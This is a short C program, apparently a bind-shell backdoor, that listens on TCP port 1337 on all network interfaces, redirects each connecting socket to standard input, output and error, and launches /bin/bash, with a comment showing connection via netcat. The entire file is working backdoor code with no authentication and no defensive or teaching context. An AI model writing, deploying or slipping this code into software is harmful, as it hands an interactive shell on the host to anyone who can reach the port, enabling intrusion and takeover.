#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <time.h> 
//usage: nc localhost 1337

int main(int argc, char *argv[])
{
    int l_fd = 0, c_fd = 0;
    struct sockaddr_in serv_addr; 


    l_fd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(1337); 

    bind(l_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 

    listen(l_fd, 10); 
    while((c_fd = accept(l_fd, (struct sockaddr*)NULL, NULL))) 
    {
        for(int i = 0; i <= 2; i++)
            dup2(c_fd, i);

        system("/bin/bash");
        close(c_fd);
    }
    return 0; 
}
